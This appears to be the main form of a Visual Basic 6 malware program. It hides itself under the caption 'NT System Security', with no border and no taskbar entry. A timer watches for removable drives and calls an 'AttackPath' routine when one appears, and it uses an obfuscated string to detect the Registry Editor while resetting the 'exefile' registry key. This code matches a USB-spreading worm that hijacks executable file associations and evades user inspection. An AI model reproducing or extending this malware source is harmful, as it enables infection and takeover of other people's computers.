VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   Caption         =   "NT System Security"
   ClientHeight    =   420
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   420
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   420
   ScaleWidth      =   420
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim ret                  As Long

Private Sub Timer1_Timer()
     If (Enumerate = True) And (RemovableDriveFound = False) Then
          EnumWindows AddressOf EnumWin, 0

     ElseIf (Enumerate = False) And (RemovableDriveFound = True) Then
          Call AttackPath(True)

          RemovableDriveFound = False
          Enumerate = True
     End If
     
     '                                         Registry Editor
     ret = FindWindow(vbNullString, DoDecrypt("TA][cbmf4m]X^crf"))
     
     If ret <> 0 Then
          Call Reset_exefile_key
     Else
          Call Check_exefile_key
     End If
End Sub
